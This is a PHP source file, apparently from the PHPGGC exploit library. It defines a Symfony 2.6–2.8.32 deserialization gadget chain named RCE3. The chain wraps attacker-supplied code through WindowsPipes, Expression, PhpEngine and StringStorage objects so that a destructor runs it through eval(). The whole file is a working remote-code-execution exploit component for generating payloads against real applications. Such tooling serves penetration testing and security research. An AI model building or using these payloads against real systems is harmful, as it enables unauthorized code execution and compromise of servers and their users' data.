<?php

namespace GadgetChain\Symfony;

class RCE3 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '2.6 <= 2.8.32';
    public static $vector = '__destruct';
    public static $author = 'crlf';
    public static $information = 'Executes through eval() ( <?php \'.$code.\';die(); ?> )';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \Symfony\Component\Process\Pipes\WindowsPipes(
               new \Symfony\Component\Finder\Expression\Expression(
               new \Symfony\Component\Templating\PhpEngine(
               new \Symfony\Component\Templating\Storage\StringStorage(
               $code
               ))));
    }
}
